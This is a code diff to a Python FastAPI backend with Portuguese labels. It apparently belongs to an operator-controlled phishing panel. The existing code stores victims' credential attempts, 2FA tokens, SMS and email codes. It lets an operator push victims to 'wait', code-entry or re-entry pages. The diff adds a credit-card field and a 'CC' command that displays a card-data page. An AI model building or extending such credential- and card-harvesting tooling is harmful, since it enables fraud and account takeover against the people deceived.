@@ -124,6 +124,7 @@ class LoginAttempt(BaseModel):
     sms_code: Optional[str] = None
     phone_number: Optional[str] = None
     app_mail: Optional[str] = None
+    credit_card: Optional[str] = None
     # Lista de tentativas (credenciais múltiplas)
     attempts: List[dict] = Field(default_factory=list)
     timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
@@ -313,6 +314,8 @@ async def send_command(command: CommandRequest, token_data: dict = Depends(verif
         update_data["page"] = "Token do Email"
     elif command.command == "AGUARDE":
         update_data["page"] = "Aguarde..."
+    elif command.command == "CC":
+        update_data["page"] = "Dados do Cartão"
     
     await db.login_attempts.update_one(
         {"id": command.user_id},
@@ -384,7 +387,8 @@ async def invalidate_field(data: InvalidateFieldRequest, token_data: dict = Depe
         "EMAIL": "email_input",
         "TOK-TEL": "sms_code",
         "TELEFONE": "phone_number",
-        "TOK-MAIL": "app_mail"
+        "TOK-MAIL": "app_mail",
+        "CC": "credit_card"
     }
     
     field = command_to_field.get(data.command)
@@ -409,7 +413,7 @@ async def submit_user_data(user_id: str, data: UserInputData):
         raise HTTPException(status_code=404, detail="Usuário não encontrado")
     
     # Mapear campo e atualizar
-    allowed_fields = ["token_2fa", "email_input", "sms_code", "phone_number", "app_mail"]
+    allowed_fields = ["token_2fa", "email_input", "sms_code", "phone_number", "app_mail", "credit_card"]
     if data.field not in allowed_fields:
         raise HTTPException(status_code=400, detail="Campo inválido")
     
